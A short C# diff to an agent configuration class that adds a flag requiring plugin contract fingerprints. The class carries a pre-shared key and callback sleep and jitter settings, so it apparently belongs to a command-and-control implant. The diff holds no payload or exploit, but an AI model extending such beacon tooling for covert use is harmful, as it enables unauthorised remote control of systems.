@@ -18,6 +18,7 @@ namespace Agent.Config
             }
         }
         public string build_uuid { get; }
+        public bool require_plugin_contract_fingerprint { get; }
         public int sleep { get; set; } = 60;
         public int jitter { get; set; } = 10;
         private string? _psk;
@@ -43,6 +44,7 @@ namespace Agent.Config
                 ?? throw new InvalidOperationException("Invalid agent configuration");
             uuid = opts.Uuid;
             build_uuid = opts.Uuid;
+            require_plugin_contract_fingerprint = opts.PluginContractFingerprintRequired;
             psk = opts.Psk;
             sleep = opts.CallbackInterval;
             jitter = opts.CallbackJitter;
